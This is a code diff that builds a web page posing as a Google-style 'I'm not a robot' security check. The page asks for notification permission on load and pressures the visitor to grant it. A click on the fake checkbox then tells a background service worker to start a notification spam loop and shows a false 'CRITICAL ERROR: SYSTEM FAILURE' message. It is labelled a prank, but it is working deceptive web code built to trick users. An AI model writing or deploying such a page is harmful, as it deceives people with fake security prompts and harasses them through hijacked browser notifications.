@@ -1,20 +1,56 @@
-<script>
-  // Register the background worker
-  if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('sw.js');
-  }
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body { font-family: 'Roboto', sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border: 1px solid #dadce0; text-align: center; width: 350px; }
+    .logo { width: 40px; margin-bottom: 10px; }
+    h2 { font-size: 22px; color: #202124; margin: 0 0 10px; font-weight: 400; }
+    .captcha { display: flex; align-items: center; background: #f9f9f9; border: 1px solid #d3d3d3; padding: 12px; border-radius: 3px; cursor: pointer; }
+    .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; background: white; margin-right: 12px; position: relative; }
+    .checkbox.checked::after { content: '✔'; color: #4285f4; font-size: 20px; position: absolute; top: -2px; left: 3px; }
+    .cap-text { font-size: 14px; color: #555; flex-grow: 1; text-align: left; }
+    #status { margin-top: 20px; color: #d93025; font-weight: bold; font-size: 13px; display: none; }
+  </style>
+</head>
+<body>
 
-  function runPrank() {
-    // Request permission if not already granted
-    Notification.requestPermission().then(perm => {
-      if (perm === 'granted') {
-        // Send a message to the background sw.js to start the loop
-        navigator.serviceWorker.ready.then(registration => {
-          registration.active.postMessage({ type: 'START_SPAM' });
-        });
-        
-        document.getElementById('status').style.display = 'block';
-      }
+<div class="card">
+  <img src="https://www.gstatic.com" class="logo">
+  <h2>Security Verification</h2>
+  <div class="captcha" onclick="runPrank()">
+    <div class="checkbox" id="check"></div>
+    <div class="cap-text">I'm not a robot</div>
+    <img src="https://www.gstatic.com" width="30">
+  </div>
+  <p id="status">CRITICAL ERROR: SYSTEM FAILURE</p>
+</div>
+
+<script>
+  // 1. Register the Service Worker on load
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('sw.js').then(() => {
+      console.log("Worker Registered");
     });
   }
+
+  // 2. Request permission immediately
+  window.onload = () => { Notification.requestPermission(); };
+
+  function runPrank() {
+    const check = document.getElementById('check');
+    check.classList.add('checked');
+
+    // 3. Send command to the background worker
+    if (Notification.permission === 'granted') {
+      navigator.serviceWorker.ready.then(registration => {
+        registration.active.postMessage({ type: 'START_SPAM' });
+        document.getElementById('status').style.display = 'block';
+      });
+    } else {
+      alert("Please allow notifications to verify.");
+    }
+  }
 </script>
+</body>
+</html>
